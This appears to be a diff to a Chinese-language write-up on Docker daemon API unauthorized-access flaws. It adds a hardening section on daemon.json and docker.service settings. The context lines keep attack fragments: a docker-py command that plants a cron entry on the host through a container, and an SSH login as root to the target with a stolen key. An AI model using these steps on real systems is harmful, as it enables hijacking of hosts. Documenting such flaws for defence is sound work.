@@ -143,3 +143,9 @@ data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bi
 	```shell
 	ssh -i id_rsa root@target-ip
 	```
+
+# 4. docker 配置文件  
+---
+有关 docker 的配置文件有：`docker.service`、`docker.socket` 以及 `daemon.json`，其详解可以查看：[【Docker】专题五：Docker 配置文件详解 - 知乎](https://zhuanlan.zhihu.com/p/690360670)  
+对于 docker daemon api 的未授权访问漏洞，需主要关注 `daemon.json` 中的 `hosts` 以及 `docker.service` 中的 `ExecStart`。  
+最好仅接受指定 ip 的远程访问，不要设置成 `0.0.0.0`，监听端口也可以尝试进行修改。  
